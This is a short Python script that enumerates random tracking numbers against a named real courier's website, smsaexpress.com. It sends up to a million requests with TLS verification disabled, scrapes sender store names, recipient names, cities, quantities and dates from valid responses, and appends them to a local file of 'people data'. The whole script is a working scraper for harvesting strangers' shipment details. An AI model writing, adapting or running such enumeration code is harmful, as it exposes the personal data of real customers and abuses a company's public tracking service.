import requests
import random
for i in range(1000000):
    x = random.randrange(000000000,300000000,1)
    print(f'[{i}] 290{x}')
    url = f'https://smsaexpress.com/trackingdetails?tracknumbers=290{x}'
    req = requests.post(url=url,verify=False)
    content = req.text[req.text.find('<div class="row">') :req.text.find('<div class="row">') + 3000]
    c = content.strip().split('<p>')
    if (req.text.find('This tracking number is not found, please check again later or contact the sender.') > 0):
        p=0
    else:
        try:
            print(req.status_code)
            pepole = 'store name -> ' + c[1][0:c[1].find('</p>')] + '\n From city -> ' + c[2][0:c[2].find('</p>')] + '\n name -> ' + c[4][0:c[4].find('</p>')] + '\n To city -> ' + c[5][0:c[5].find('</p>')] + '\n size -> ' + c[6][0:c[6].find('</p>')] + '\n Quantity -> ' + c[8][0:c[8].find('</p>')] + '\n Date -> '+c[7][0:c[7].find('</p>')]
            print(pepole)
            save_s = open('pepole_data_samaexpress.txt', 'a')
            save = save_s.write('\n'+pepole)
            save_s.close()
        except:
            print(f'valid number -> {x}')
